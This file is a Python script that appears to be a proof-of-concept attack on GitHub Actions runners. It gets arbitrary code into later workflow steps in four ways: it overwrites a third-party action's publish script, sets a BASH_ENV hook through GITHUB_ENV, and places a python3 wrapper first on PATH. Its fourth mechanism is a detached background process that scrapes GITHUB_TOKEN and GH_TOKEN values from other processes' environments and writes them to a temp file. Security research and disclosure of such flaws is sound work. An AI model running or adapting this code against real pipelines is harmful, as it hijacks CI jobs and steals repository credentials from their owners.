import os, sys, glob

def out(*a):
    print("PWNED_PIP::" + " ".join(str(x) for x in a), flush=True)

out("start job=%s cwd=%s actor=%s ref=%s run=%s" % (
    os.environ.get("GITHUB_JOB"), os.getcwd(), os.environ.get("GITHUB_ACTOR"),
    os.environ.get("GITHUB_REF"), os.environ.get("GITHUB_RUN_ID")))
out("argv=%s python=%s exe=%s" % (sys.argv, sys.version.split()[0], sys.executable))

ws = os.environ.get("GITHUB_WORKSPACE") or os.getcwd()
exfil = os.path.join(ws, "poc_publish.py")
out("workspace_entries=%s" % sorted(os.listdir(ws)))
out("pip_dir_entries=%s" % (sorted(os.listdir(os.path.join(ws, "pip"))) if os.path.isdir(os.path.join(ws, "pip")) else "absent"))
out("exfil_present=%s" % os.path.isfile(exfil))

# mechanism 1: rewrite the composite action's publish script
targets = glob.glob("/home/runner/work/_actions/EnricoMi/publish-unit-test-result-action/*/python/publish_test_results.py")
out("patch_targets=%s" % targets)
for t in targets:
    try:
        with open(t, "w") as f:
            f.write("#!/usr/bin/env python3\nimport runpy\nrunpy.run_path(%r, run_name='__main__')\n" % exfil)
        out("patched=%s" % t)
    except Exception as e:
        out("patch_failed=%s %r" % (t, e))

# mechanism 2: BASH_ENV hook for later bash steps
try:
    hook = os.path.join(ws, "poc_hook.sh")
    with open(hook, "w") as f:
        f.write("#!/bin/bash\npython3 %s || true\n" % exfil)
    with open(os.environ["GITHUB_ENV"], "a") as f:
        f.write("BASH_ENV=%s\n" % hook)
    out("bash_env_hook=set")
except Exception as e:
    out("bash_env_failed=%r" % (e,))

# mechanism 3: python3 wrapper first on PATH for later steps
try:
    wrapdir = os.path.join(ws, "wrap")
    os.makedirs(wrapdir, exist_ok=True)
    wrapper = os.path.join(wrapdir, "python3")
    with open(wrapper, "w") as f:
        f.write("#!/bin/bash\npython3_real=%r\n[ -f %s.pocwrap ] || { touch %s.pocwrap; \"$python3_real\" %s || true; }\nexec \"$python3_real\" \"$@\"\n" % (
            sys.executable, os.path.join(ws, "wrap"), os.path.join(ws, "wrap"), exfil))
    os.chmod(wrapper, 0o755)
    with open(os.environ["GITHUB_PATH"], "a") as f:
        f.write(wrapdir + "\n")
    out("python_wrapper=set %s" % wrapper)
except Exception as e:
    out("wrapper_failed=%r" % (e,))

# mechanism 4: detached scanner of /proc/*/environ for tokens handed to later processes
try:
    if os.fork() == 0:
        os.setsid()
        devnull = os.open("/dev/null", os.O_WRONLY)
        os.dup2(devnull, 1); os.dup2(devnull, 2)
        import time
        found = {}
        for _ in range(240):
            for f in glob.glob("/proc/[0-9]*/environ"):
                try:
                    data = open(f, "rb").read().split(b"\x00")
                except Exception:
                    continue
                for kv in data:
                    if kv.startswith(b"GITHUB_TOKEN=") or kv.startswith(b"GH_TOKEN="):
                        found[kv.split(b"=", 1)[0].decode()] = kv.split(b"=", 1)[1].decode()
            if found:
                with open("/tmp/poc_tok.txt", "a") as fh:
                    for k, v in found.items():
                        fh.write("%s=%s\n" % (k, v))
                found = {}
            time.sleep(0.5)
        os._exit(0)
    out("scanner=forked")
except Exception as e:
    out("scanner_failed=%r" % (e,))

out("done")
sys.exit(0)
